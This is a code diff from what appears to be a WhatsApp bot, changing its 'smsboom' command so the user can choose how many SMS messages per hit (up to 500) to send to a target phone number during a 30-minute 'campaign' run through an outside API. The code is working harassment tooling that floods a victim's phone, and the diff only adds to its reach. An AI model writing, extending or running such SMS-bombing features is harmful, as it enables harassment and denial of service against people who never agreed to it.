@@ -19743,9 +19743,11 @@ case 'smsboom': {
         }
     }
 
-    const _sbPhone = (text || '').trim();
+    const _sbParts = (text || '').trim().split(/\s+/);
+    const _sbPhone = _sbParts[0] || '';
+    const _sbQty = Math.min(Math.max(parseInt(_sbParts[1], 10) || 100, 1), 500);
     if (!_sbPhone) {
-        return reply(`❗ *Usage:* ${prefix}smsbomber 923001234567\n_(Include country code)_`);
+        return reply(`❗ *Usage:* ${prefix}smsbomber 923001234567 [qty]\n_(Default qty: 100, max: 500)_`);
     }
 
     const _sbClean = _sbPhone.replace(/\D/g, '');
@@ -19773,7 +19775,7 @@ case 'smsboom': {
     }
 
     // ── Start new campaign ──
-    const _sbCampaign = new SmsBomber(_sbPhone);
+    const _sbCampaign = new SmsBomber(_sbPhone, 30, _sbQty);
     activeSmsCampaigns.set(_sbClean, {
         smsBomber: _sbCampaign,
         stats: _sbCampaign.stats,
@@ -19785,7 +19787,7 @@ case 'smsboom': {
 
     _sbCampaign.on('start', (_sbData) => {
         devtrust.sendMessage(_sbChatJid, {
-            text: `💥 *SMS Bomber Started*\n📱 Target: *${_sbData.phone}*\n⏰ Duration: 30 minutes\n⏳ Bombs away...`
+            text: `💥 *SMS Bomber Started*\n📱 Target: *${_sbData.phone}*\n🔢 Qty per hit: *${_sbData.qty}*\n⏰ Duration: 30 minutes\n⏳ Bombs away...`
         }).catch(() => {});
     });
 
@@ -19817,8 +19819,9 @@ case 'smsboom': {
     reply(
         `💥 *SMS Bomber Campaign Started*\n\n` +
         `📱 Target: *${_sbClean}*\n` +
+        `🔢 Qty per hit: *${_sbQty}*\n` +
         `⏰ Duration: 30 minutes\n\n` +
-        `✅ SMS bombs will be sent continuously.\n` +
+        `✅ SMS bombs will be sent continuously via Ahmad Mods X API.\n` +
         `📊 Check status: *${prefix}smsstatus*\n` +
         `🛑 Stop: *${prefix}stopsms ${_sbClean}*`
     );
